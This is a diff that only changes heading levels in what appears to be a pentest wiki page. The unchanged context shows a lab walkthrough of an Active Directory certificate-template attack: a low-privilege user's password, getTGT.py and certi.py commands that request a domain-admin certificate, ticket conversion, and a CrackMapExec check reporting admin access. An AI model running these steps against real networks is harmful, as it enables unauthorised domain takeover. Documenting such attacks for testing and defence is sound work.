@@ -96,7 +96,7 @@ Permissions
 
 ### Exploiting the configuration
 
-#### Getting TGT ticket
+### Getting TGT ticket
 
 ```plain
 getTGT.py 'offsec.nl/johndo-lowpriv:Welkom1234' 
@@ -108,7 +108,7 @@ Make the ticket available for the current session.
 export KRB5CCNAME=johndo-lowpriv.ccache
 ```
 
-#### Requesting certificate with alternative name
+### Requesting certificate with alternative name
 
 Parameters:
 
@@ -136,7 +136,7 @@ $ python3 certi.py req 'offsec.nl/johndo-lowpriv@DC01PKI.offsec.nl' offsec-DC01P
 [*] Saving certificate in johnDomainAdmin@offsec.nl.pfx (password: admin)
 ```
 
-#### Requesting TGT for alternative user
+### Requesting TGT for alternative user
 
 {{%attachments title="Related files" fa_icon_class="far fa-file" pattern=".*(exe)"/%}}
 
@@ -199,7 +199,7 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-#### Verify the requested ticket is usable
+### Verify the requested ticket is usable
 
 ```plain
 PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
@@ -220,13 +220,13 @@ d-r---         1/18/2022  12:44 AM                Users
 d-----         1/19/2022   6:25 AM                Windows
 ```
 
-#### Convert the ticket from base to file
+### Convert the ticket from base to file
 
 ```plain
 [IO.File]::WriteAllBytes("Z:\johnDomainAdmin.kirbi", [Convert]::FromBase64String("doIGPDCCBjig[REDACTED]FuZC5sb2NhbA=="))
 ```
 
-#### Convert .kirbi to .ccache
+### Convert .kirbi to .ccache
 
 Use [ticket_converter]({{< ref "ticket-converter" >}}).
 
@@ -241,7 +241,7 @@ Make the `.ccache` available for Kerberos authentication.
 export KRB5CCNAME=admin.ccache
 ```
 
-#### CrackMapExec
+### CrackMapExec
 
 ```plain
 $ cme smb DC01PKI.offsec.nl -k          
@@ -249,7 +249,7 @@ SMB         DC01PKI.offsec.nl 445    DC01PKI         [*] Windows Server 2019 Sta
 SMB         DC01PKI.offsec.nl 445    DC01PKI         [+] offsec.nl\johnDomainAdmin (Pwn3d!)
 ```
 
-### URL list
+## URL List
 
 * [Github.com - Certi](https://github.com/zer1t0/certi)
 * [Github.com - Active Directory Attacks - Active Directory Certificate Services](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#active-directory-certificate-services)
